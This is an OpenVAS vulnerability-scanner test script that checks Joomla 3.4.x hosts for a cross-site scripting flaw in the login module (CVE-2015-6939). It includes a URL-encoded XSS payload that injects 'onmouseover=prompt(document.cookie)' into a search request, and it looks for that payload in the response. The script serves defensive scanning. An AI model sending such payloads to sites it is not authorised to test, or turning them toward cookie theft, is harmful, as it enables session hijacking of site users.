###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_login_module_xss_vuln.nasl 11872 2018-10-12 11:22:41Z cfischer $
#
# Joomla CMS 'login' Module Cross-Site Scripting Vulnerability
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.806600");
  script_version("$Revision: 11872 $");
  script_cve_id("CVE-2015-6939");
  script_bugtraq_id(76750);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 13:22:41 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2015-10-19 15:49:11 +0530 (Mon, 19 Oct 2015)");

  script_name("Joomla CMS 'login' Module Cross-Site Scripting Vulnerability");

  script_tag(name:"summary", value:"This host is running Joomla and is prone
  to cross site scripting vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"Flaw is due to error in login module which
  does not properly filter HTML code from user-supplied input before displaying
  the input.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to execute arbitrary script code in a user's browser session within
  the trust relationship between their browser and the server.");

  script_tag(name:"affected", value:"Joomla versions 3.4.x before 3.4.4.");

  script_tag(name:"solution", value:"Upgrade to version 3.4.4 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_xref(name:"URL", value:"http://www.securitytracker.com/id/1033541");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/133907");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_mandatory_keys("joomla/installed");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"https://www.joomla.org");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!http_port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:http_port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/index.php/?Itemid=1&option=com_search&searchword=%f6%22%20on" +
            "mouseover%3dprompt%28document.cookie%29%20//&task=search";

if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
   pattern:"onmouseover=prompt\(document.cookie\)",
   extra_check:'content="Joomla!'))
{
  report = report_vuln_url( port:http_port, url:url );
  security_message(port:http_port, data:report);
  exit(0);
}

exit(99);
